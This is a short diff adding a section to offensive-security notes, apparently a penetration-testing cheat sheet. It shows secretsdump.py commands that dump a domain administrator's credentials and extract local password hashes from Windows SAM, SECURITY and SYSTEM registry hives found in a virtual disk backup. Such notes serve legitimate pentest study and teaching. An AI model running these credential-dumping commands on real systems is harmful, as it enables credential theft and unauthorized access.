@@ -29,3 +29,12 @@ secretsdump.py -just-dc-user $domain/administrator -k -no-pass "$hostName"@$host
 secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
 ```
 
+
+#### Retrieving Hashes using Secretsdump.py
+
+Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` registry hives. We can then use a tool such as [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to extract the password hashes for local users.
+
+```bash
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
+```
+
